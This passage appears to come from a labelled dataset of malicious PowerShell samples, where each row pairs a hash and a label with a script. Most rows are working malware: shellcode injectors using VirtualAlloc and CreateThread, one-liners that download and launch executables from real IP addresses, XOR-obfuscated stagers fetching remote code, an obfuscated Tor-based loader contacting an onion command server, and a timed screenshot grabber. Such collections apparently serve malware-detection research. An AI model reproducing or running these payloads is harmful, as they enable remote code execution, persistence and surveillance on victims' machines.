0x8f,0xf5,0xc0,0x96,0x50,0x20,0xad,0x98,0xdb,0xc7,0x51,0x56,0x2c,0xad,0x41,0x0e,0xdc,0xf8,0x38,0x98,0xe3,0xd6,0x57,0x24,0x76,0xdd,0xf1,0x73,0xee,0xdf,0x24,0xb3,0xb1,0x20,0x03,0xc8,0x78,0xb5,0xec,0xa6,0x84,0x59,0xed,0x36,0xd3,0x33,0xed,0x5e,0x83,0x67,0xbe,0x7b,0xcc,0xbd,0xd2,0xd0,0x59,0x3e,0x83,0x85,0xca,0x56,0x29,0xf0,0x3d,0xf9,0xd2,0xd7,0xbf,0xc5,0x04,0x11,0xca,0x27,0x95;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BuC=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BuC.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BuC,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
61ac0d87c7d61ba0b3f1960aa33cc251cbe09eaf510103796b6876f6352dc055,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms77jKjpDZLz+5qJydgTc1G12GPlpirfFPUMZrPTT7DNJxcXZViIUgod/NslUgURWR2zyiJVE35RxkERJDTm/spcaTyQ0n9na0yfo/Z3m1dwk5AlFMUuomtyR2cJJe15oxKNf39e1obn+Yn2fJjjFmkpq11JMks6zKW1pSfWrLh7XpO1HSLOoJH3JPZAQ3PCtl+GGGPtGG1BWkRGXA3SmtwFPgTRMYiVJ4Playy81HTMOwI7iDXFSSCkGw9XPAHoqbCmLGM8pc63qfQi0NJZwTskgg+t4hYUIdE2RoOXUZ6xJuobbI8nPy9QepxEHh1pNAywMtbuba4GzOyC09rv2b7RKgGzxOpAMTPjx8+fvAOWlicB+dtN368sKfesR5gdDLejgkkrHZ4RLf+35RcRmnBrlhysYZp6lbERJso44SN8WSipJY5N/N2eP7gC5586JfQBevhRdAF09jm1J1A6J6ulEs2933m/32WGN/Wnkk8GhJzHeIZdQ7yUl8jgXiMbM+dPbi1IUM1vTcQ1ySM+FgmiGaU8a9h5RmVT7FGTJlLBHKAyAiyAo61l8nsSFLT9bBFZoDXbp4GOjwQNTl474W8PuyezMEpXWI4ijJKJ4aqcjKKRTAjbkZBYUT3JhRLvh2mn9NtxUxSB0fysNxEewHmftMSDyMpYgd4BABurTlxKGYJHhmlRl1irC3qHzZPv4pGCTNGQx9WWgAb8CZBwZKJOgTkmShBy1pE1mdzRmbgsi3xCsM+FPS+IrZqwj5x069meVD8Tt4JKAc0jnIEpi3GZUaxqZBwXSQAH2vrj1I5ui+ekyoJsudHPZTS2FjLRPgpgfitwQdOPlHrHqwtNEICLBXBZwaOyHnRkgJAUz/pN7SE4BnWQ9ZyjAeaR0uar7fgv0/P6ty8cK8b05ouzFXgoXpUb9U6ZrdWKy4all2UVrkurzt12SrfTacWqvX6Qzmqo9otzT0Mi5t5g26sJnKHK/18Y2yWOWO1mfquNzQ9z7/wrF7+S4U2B6WukSvgplmOmwNjaeSKUZkua13a7z40KvJ+aDPc93T/Lv8V01VTTO08b23qCFWDM2fT8Oxq0HLXw5r+dVB8QGWESmHZrhj8emgI1NFt7Nt88JgT+gDYMJwWJaNuv2J0uxUD9avTR/Or7kPsHQ6MgV2go/ldL4B5BVK41nPFOiDPh10AqcoR9nvg45cKTuCBj/kZGZ/bPCrgB4MjA3wqo0fIazivdBjYb/sFjmzWvsOoOVpXdD0/7BRRLUcHVR8lS2Lf6GIULcyNqedtl7uDL+2hp9t37EI3S7dzx9N1fVkzr51RfnV5c3HZHFB7xlFf1+1PiUJAIinZp51Co2wecf7WVd/CIgowAy3A9X2ozQoXlf1d3OE0iVDVp/78QERIGPQ06HoHbSPGuJN0hhc3N3SnXc+YQKH2YXhWeHWkKU+O2nPTOLy6uhpBxlAtT1LONknoyyCTW53lcnDz51bFHBz9/Uct8flafV4vk7SPJ9Be7MS2O2lJSaV417pplHqroND4/4Hd13QAP+57gX1+9xvru8DOZZ7h+MX08sV/Av6PoBhgKsHbgvuJkV3v/D0ie1UdfX8cUQeq8fZP8kF4E8vTNnyd/AsSXdN6iAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
c801786f584f0df5023ce939384f4df67439e5b72ed95808580b94bc8d898bcb,"
(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'

",Payload
76ba2adb0433580da9409efd70871681f382cf9c5a928b4644a8b6db8b3d1b15,"
$yevg = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yevg -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xd9,0x74,0x24,0xf4,0xba,0xe4,0x6b,0x3e,0x0a,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0xf0,0x89,0xcb,0xf6,0x10,0xcf,0x34,0x07,0xe0,0xb0,0xbd,0xe2,0xd1,0xf0,0xda,0x67,0x41,0xc1,0xa9,0x2a,0x6d,0xaa,0xfc,0xde,0xe6,0xde,0x28,0xd0,0x4f,0x54,0x0f,0xdf,0x50,0xc5,0x73,0x7e,0xd2,0x14,0xa0,0xa0,0xeb,0xd6,0xb5,0xa1,0x2c,0x0a,0x37,0xf3,0xe5,0x40,0xea,0xe4,0x82,0x1d,0x37,0x8e,0xd8,0xb0,0x3f,0x73,0xa8,0xb3,0x6e,0x22,0xa3,0xed,0xb0,0xc4,0x60,0x86,0xf8,0xde,0x65,0xa3,0xb3,0x55,0x5d,0x5f,0x42,0xbc,0xac,0xa0,0xe9,0x81,0x01,0x53,0xf3,0xc6,0xa5,0x8c,0x86,0x3e,0xd6,0x31,0x91,0x84,0xa5,0xed,0x14,0x1f,0x0d,0x65,0x8e,0xfb,0xac,0xaa,0x49,0x8f,0xa2,0x07,0x1d,0xd7,0xa6,0x96,0xf2,0x63,0xd2,0x13,0xf5,0xa3,0x53,0x67,0xd2,0x67,0x38,0x33,0x7b,0x31,0xe4,0x92,0x84,0x21,0x47,0x4a,0x21,0x29,0x65,0x9f,0x58,0x70,0xe1,0x6c,0x51,0x8b,0xf1,0xfa,0xe2,0xf8,0xc3,0xa5,0x58,0x97,0x6f,0x2d,0x47,0x60,0x90,0x04,0x3f,0xfe,0x6f,0xa7,0x40,0xd6,0xab,0xf3,0x10,0x40,0x1a,0x7c,0xfb,0x90,0xa3,0xa9,0x96,0x95,0x33,0x92,0xcf,0x9e,0xa6,0x7a,0x12,0x9f,0x29,0xc0,0x9b,0x79,0x79,0x66,0xcc,0xd5,0x39,0xd6,0xac,0x85,0xd1,0x3c,0x23,0xf9,0xc1,0x3e,0xe9,0x92,0x6b,0xd1,0x44,0xca,0x03,0x48,0xcd,0x80,0xb2,0x95,0xdb,0xec,0xf4,0x1e,0xe8,0x11,0xba,0xd6,0x85,0x01,0x2a,0x17,0xd0,0x78,0xfc,0x28,0xce,0x17,0x00,0xbd,0xf5,0xb1,0x57,0x29,0xf4,0xe4,0x9f,0xf6,0x07,0xc3,0x94,0x3f,0x92,0xac,0xc2,0x3f,0x72,0x2d,0x12,0x16,0x18,0x2d,0x7a,0xce,0x78,0x7e,0x9f,0x11,0x55,0x12,0x0c,0x84,0x56,0x43,0xe1,0x0f,0x3f,0x69,0xdc,0x78,0xe0,0x92,0x0b,0x79,0xdc,0x44,0x75,0x0f,0x0c,0x55;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$puU=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($puU.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$puU,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
a7e181e0e4d39b487c05511d9de542f1b9e76d1ef8fc125bc0ccf96d988a9d80,"
$RqV = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $RqV -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0xb8,0x90,0xdd,0x2c,0xfe,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x14,0x03,0x45,0x84,0x3f,0xd9,0x02,0x4c,0x3d,0x22,0xfb,0x8c,0x22,0xaa,0x1e,0xbd,0x62,0xc8,0x6b,0xed,0x52,0x9a,0x3e,0x01,0x18,0xce,0xaa,0x92,0x6c,0xc7,0xdd,0x13,0xda,0x31,0xd3,0xa4,0x77,0x01,0x72,0x26,0x8a,0x56,0x54,0x17,0x45,0xab,0x95,0x50,0xb8,0x46,0xc7,0x09,0xb6,0xf5,0xf8,0x3e,0x82,0xc5,0x73,0x0c,0x02,0x4e,0x67,0xc4,0x25,0x7f,0x36,0x5f,0x7c,0x5f,0xb8,0x8c,0xf4,0xd6,0xa2,0xd1,0x31,0xa0,0x59,0x21,0xcd,0x33,0x88,0x78,0x2e,0x9f,0xf5,0xb5,0xdd,0xe1,0x32,0x71,0x3e,0x94,0x4a,0x82,0xc3,0xaf,0x88,0xf9,0x1f,0x25,0x0b,0x59,0xeb,0x9d,0xf7,0x58,0x38,0x7b,0x73,0x56,0xf5,0x0f,0xdb,0x7a,0x08,0xc3,0x57,0x86,0x81,0xe2,0xb7,0x0f,0xd1,0xc0,0x13,0x54,0x81,0x69,0x05,0x30,0x64,0x95,0x55,0x9b,0xd9,0x33,0x1d,0x31,0x0d,0x4e,0x7c,0x5d,0xe2,0x63,0x7f,0x9d,0x6c,0xf3,0x0c,0xaf,0x33,0xaf,0x9a,0x83,0xbc,0x69,0x5c,0xe4,0x96,0xce,0xf2,0x1b,0x19,0x2f,0xda,0xdf,0x4d,0x7f,0x74,0xf6,0xed,0x14,0x84,0xf7,0x3b,0x80,0x81,0x6f,0x04,0xfd,0x1b,0xef,0xec,0xfc,0x1b,0xfe,0xb0,0x89,0xfa,0x50,0x19,0xda,0x52,0x10,0xc9,0x9a,0x02,0xf8,0x03,0x15,0x7c,0x18,0x2c,0xff,0x15,0xb2,0xc3,0x56,0x4d,0x2a,0x7d,0xf3,0x05,0xcb,0x82,0x29,0x60,0xcb,0x09,0xde,0x94,0x85,0xf9,0xab,0x86,0x71,0x0a,0xe6,0xf5,0xd7,0x15,0xdc,0x90,0xd7,0x83,0xdb,0x32,0x80,0x3b,0xe6,0x63,0xe6,0xe3,0x19,0x46,0x7d,0x2d,0x8c,0x29,0xe9,0x52,0x40,0xaa,0xe9,0x04,0x0a,0xaa,0x81,0xf0,0x6e,0xf9,0xb4,0xfe,0xba,0x6d,0x65,0x6b,0x45,0xc4,0xda,0x3c,0x2d,0xea,0x05,0x0a,0xf2,0x15,0x60,0x8a,0xce,0xc3,0x4c,0xf8,0x3e,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IYT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IYT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IYT,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
3feb50b473c9c7d18a82d95a46c655fd56f4742718b32912db6e766f94e5da51,"
'iewtZ';$ErrorActionPreference = 'SilentlyContinue';'sLfbdc';'SvpvZJY';$vyih = (get-wmiobject Win32_ComputerSystemProduct).UUID;'gwWrloV';'ouvd';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $vyih){;'cLJEJvJeL';'ESlFQFDG';(Get-Process -id $pid).Kill();'BNBekbF';'iCIcWAWiH';};'updYlRxc';'Yu';function e($cxj){;'INWYxMFSSxC';'hljZOzviQHL';$muo = (((iex ""nslookup -querytype=txt $cxj 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wqBuiyIUeiD';'EZXzZnfj';$ii.DownloadFile($muo, $yoe);'mllh';'gxp';$vi = $vpw.NameSpace($yoe).Items();'DUtRuXurl';'wwtbOkl';$vpw.NameSpace($phi).CopyHere($vi, 20);'ZOcGNFapCd';'fvVhKXFhu';rd $yoe;'bXAJndTZDgZ';'JC';};'OCLQDWnfu';'ikobA';'eSOzl';'FswTHfHzbr';'tTjbUWY';'zpzTfITAjM';$phi = $env:APPDATA + '\' + $vyih;'pcqZ';'lOoNehXCNKV';if (!(Test-Path $phi)){;'YK';'DRt';$mc = New-Item -ItemType Directory -Force -Path $phi;'ZFzNt';'GjTw';$mc.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'NphybPzgXM';'omHVQM';};'HHFFHSs';'wnXuik';'OT';'VOLHVuXq';$uf=$phi+ '\tor.exe';'sHVRBHzTXF';'trLTGFyqlgE';$yan=$phi+ '\polipo.exe';'Vhdu';'gYvdM';$yoe=$phi+'\'+$vyih+'.zip';'ZfDN';'UCEhRONmg';$ii=New-Object System.Net.WebClient;'Ugpp';'cdNqGhCEjG';$vpw=New-Object -C Shell.Application;'MsfmRSPjrey';'qGy';'sH';'ix';if (!(Test-Path $uf) -or !(Test-Path $yan)){;'cPGfgxJLMQ';'Oafl';e 'i.vankin.de';'RpGJUxN';'EhrEGACdk';};'cFrjysajeP';'CMTJLy';'klIQuOh';'UL';if (!(Test-Path $uf) -or !(Test-Path $yan)){;'RZd';'tbVW';e 'gg.ibiz.cc';'mZASyvj';'hczjHEH';};'IMv';'yawpbSHIN';'TdYiqz';'DaKI';$iul=$phi+'\roaminglog';'KyiAtRISaBi';'MIAa';saps $uf -Ar "" --Log `""notice file $iul`"""" -wi Hidden;'Xqo';'iX';do{sleep 1;$ep=gc $iul}while(!($ep -match 'Bootstrapped 100%: Done.'));'DECq';'mMTzmo';saps $yan -a ""socksParentProxy=localhost:9050"" -wi Hidden;'qLzQnQAglU';'lc';sleep 7;'OhASXZLVhvy';'bUMQerk';$hja=New-Object System.Net.WebProxy(""localhost:8123"");'ysETIFO';'aMzeEXJatUc';$hja.useDefaultCredentials = $true;'MA';'ahxYjELWf';$ii.proxy=$hja;'kllZXZPScFE';'UnPHeDt';$laz='http://powerwormjqj42hu.onion/get.php?s=setup&mom=9C7ABD3A-D197-11DB-BBDA-BBE061E60019&uid=' + $vyih;'cmIJbcllSfd';'TRutDNn';while(!$qb){$qb=$ii.downloadString($laz)};'eaxdBgnRytG';'UcjybNgU';if ($qb -ne 'none'){;'uICtlcoEV';'udG';iex $qb;'XNNdtFqQhSF';'QzfWyKqrY';};'HqIJJF';

",TaskExecution
2385457235bc3f4009770f6ae3c637e78fbfe884243f4a8a682dcce2be48874f,"
function Get-TimedScreenshot
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$True)]             
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime    
    )

    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }

    Try {
            
        
        Add-Type -Assembly System.Windows.Forms            

        Do {
            
            $Time = (Get-Date)
            
            [String] $FileName = ""$($Time.Month)""
            $FileName += '-'
            $FileName += ""$($Time.Day)"" 
            $FileName += '-'
            $FileName += ""$($Time.Year)""
            $FileName += '-'
            $FileName += ""$($Time.Hour)""
            $FileName += '-'
            $FileName += ""$($Time.Minute)""
            $FileName += '-'
            $FileName += ""$($Time.Second)""
            $FileName += '.png'

            [String] $FilePath = (Join-Path $Path $FileName)
            Get-Screenshot

            Start-Sleep -Seconds $Interval
        }

        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}

Get-TimedScreenshot -Path ""$env:userprofile\Desktop"" -Interval 2 -EndTime 24:00

",Payload
12f0ffc415e97f419d7940bb27a74d00ec592165239af7700bd082f4e66cbaaf,"
$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg(""https://52.39.227.108:443/index.asp"")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9c326827d1336c96bd378e27aaa913e21ad726562556ac000a120a5e45646033,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',""$env:APPDATA\scvkem.exe"");Start-Process (""$env:APPDATA\scvkem.exe"")

",Payload
cb1a10a6122dddc19fee2cd3e835a638bd1a8002c6b2a23307060d7391e32965,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe9,0xbb,0x12,0x4a,0xb9,0xca,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x57,0x31,0x5a,0x17,0x83,0xea,0xfc,0x03,0x48,0x59,0x5b,0x3f,0x90,0xb5,0x19,0xc0,0x68,0x46,0x7e,0x48,0x8d,0x77,0xbe,0x2e,0xc6,0x28,0x0e,0x24,0x8a,0xc4,0xe5,0x68,0x3e,0x5e,0x8b,0xa4,0x31,0xd7,0x26,0x93,0x7c,0xe8,0x1b,0xe7,0x1f,0x6a,0x66,0x34,0xff,0x53,0xa9,0x49,0xfe,0x94,0xd4,0xa0,0x52,0x4c,0x92,0x17,0x42,0xf9,0xee,0xab,0xe9,0xb1,0xff,0xab,0x0e,0x01,0x01,0x9d,0x81,0x19,0x58,0x3d,0x20,0xcd,0xd0,0x74,0x3a,0x12,0xdc,0xcf,0xb1,0xe0,0xaa,0xd1,0x13,0x39,0x52,0x7d,0x5a,0xf5,0xa1,0x7f,0x9b,0x32,0x5a,0x0a,0xd5,0x40,0xe7,0x0d,0x22,0x3a,0x33,0x9b,0xb0,0x9c,0xb0,0x3b,0x1c,0x1c,0x14,0xdd,0xd7,0x12,0xd1,0xa9,0xbf,0x36,0xe4,0x7e,0xb4,0x43,0x6d,0x81,0x1a,0xc2,0x35,0xa6,0xbe,0x8e,0xee,0xc7,0xe7,0x6a,0x40,0xf7,0xf7,0xd4,0x3d,0x5d,0x7c,0xf8,0x2a,0xec,0xdf,0x95,0xc2,0x8a,0xab,0x65,0x73,0x22,0x3a,0x08,0xea,0x98,0xd4,0x98,0x9b,0x06,0x23,0xde,0xb1,0x76,0xf0,0x73,0x69,0x2a,0x55,0x27,0xe5,0xf6,0x0f,0xbe,0x52,0xf9,0x7a,0x13,0xce,0x6c,0x87,0xc7,0xa3,0x18,0x3b,0xe6,0x43,0xd9,0xab,0x6d,0x43,0xd9,0x2b,0x6e,0x14,0xb1,0x7c,0xe7,0x0b,0x87,0x7d,0x22,0xba,0xce,0xd2,0xa5,0xbd,0xfc,0x34,0xb1,0xed,0x53,0xe7,0xed,0x42,0x02,0x6f,0xf9,0x30,0x84,0x54,0x02,0x6f,0x4e,0xc0,0xf6,0xcf,0x07,0x94,0x34,0xf0,0xd7,0x1d,0xda,0x9a,0xd3,0x4d,0x71,0x44,0x8a,0x05,0xf0,0x3c,0xac,0x53,0x05,0x15,0x83,0x08,0xa9,0xc5,0x72,0xc6,0x60,0xec,0x62,0x6d,0x84,0x25,0x17,0x51,0x0f,0xce,0x57,0x24,0x29,0x26,0x20,0xc6,0xc9,0xb7,0xc5,0x86,0xa1,0xb7,0x09,0x06,0x32,0xd0,0x29,0x06,0x72,0x20,0x79,0x6e,0x2a,0x84,0x2e,0x8b,0x35,0x11,0x43,0x00,0x99,0x13,0x83,0xf1,0x75,0x24,0x6c,0xfd,0x85,0x77,0x3a,0x95,0x97,0xe1,0x4b,0x87,0x67,0xd8,0xc9,0x87,0xec,0x2c,0x5a,0x00,0x0c,0x70,0xd8,0xce,0x7b,0x93,0xbb,0x0d,0xdc,0xb3,0x4b,0x6e,0x1c,0xbc,0x81,0xbe,0xd2,0x70,0xd9,0x90,0x2d,0x59,0x2e,0xdc,0x4d,0x1e,0xa0,0xa9,0xec,0x36,0x2b,0xd1,0xa3,0x49,0x7e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9c326827d1336c96bd378e27aaa913e21ad726562556ac000a120a5e45646033,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',""$env:APPDATA\scvkem.exe"");Start-Process (""$env:APPDATA\scvkem.exe"")

",Payload
9dbdb5ec7578133a54cd015eb6f4099abd7f5e9bcab2ffb87fc26b5372445f0b,"
'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar "" --Log `""notice file $cvdz`"""" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a ""socksParentProxy=localhost:9050"" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(""localhost:8123"");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';

",TaskExecution
181cc8ab1e0e6a287c74f470b94a10e5e6f198a9f3f3c1b1b51b478e6e2db63f,"
$Wc=NeW-OBJECT SyStem.NET.WeBCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdeRS.Add('User-Agent',$u);$Wc.PrOXy = [SysTem.NeT.WEbReqUesT]::DEFaulTWebPrOXy;$wc.PROxY.CRedentiALs = [SyStEm.Net.CredeNtiALCache]::DefaUlTNetWoRkCReDEntIALS;$K='9452f266332bbb5008b1321beff0ecf9';$I=0;[CHAr[]]$b=([ChaR[]]($Wc.DOwnlOAdSTRIng(""http://10.0.0.131:8080/index.asp"")))|%{$_-BXOR$k[$I++%$K.LENgTH]};IEX ($b-JoIn'')

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
